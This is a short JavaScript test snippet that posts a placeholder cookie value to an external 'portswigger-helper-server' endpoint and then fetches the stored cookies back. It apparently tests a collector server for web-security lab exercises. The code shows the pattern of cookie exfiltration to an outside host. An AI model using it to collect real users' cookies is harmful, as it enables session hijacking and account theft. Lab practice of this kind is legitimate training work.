const res = await fetch('https://portswigger-helper-server.onrender.com/api', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
  },
  body: JSON.stringify({ cookies: JSON.stringify('myFakeCookie:adad2e12edsa') }),
});
const data = await res.text();
console.log(data);

const resCookies = await fetch('https://portswigger-helper-server.onrender.com/api');
const cookies = await resCookies.text();
console.log(cookies);
